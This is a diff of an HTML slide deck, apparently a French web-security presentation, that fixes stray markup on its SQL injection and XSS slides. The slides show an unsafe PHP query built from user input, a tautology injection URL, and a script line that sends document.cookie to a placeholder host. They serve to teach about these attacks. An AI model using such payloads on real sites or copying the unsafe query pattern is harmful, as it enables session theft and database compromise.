@@ -384,7 +384,7 @@
 				<section>
 					<h3>L’injection</h3>
 					<pre><code>SELECT * FROM client WHERE id='" . $_GET["id"] . "'</code></pre>
-					<pre class="fragment"><code><pre>http://exemple.com/liste?id='or '1'='1</code></pre>
+					<pre class="fragment"><code>http://exemple.com/liste?id='or '1'='1</code></pre>
 				</section>
 
 				<section>
@@ -396,8 +396,8 @@
 					<h3>XSS</h3>
 					<p>Éxecution de code Javascript sans validation</p>
 					<pre><code>Votre Nom : <input type="text" name="nom" value="" /></code></pre>
-					<pre class="fragment"><code><pre>script>alert("'echo $_POST["nom"];'");</script></code></pre>
-					<pre class="fragment"><code><pre>script>window.location = 'https://www.exemple.com? cookie=' + document.cookie</script></code></pre>
+					<pre class="fragment"><code>alert("'echo $_POST["nom"];'");</code></pre>
+					<pre class="fragment"><code>window.location = 'https://www.exemple.com? cookie=' + document.cookie;</code></pre>
 				</section>
 
 				<section>
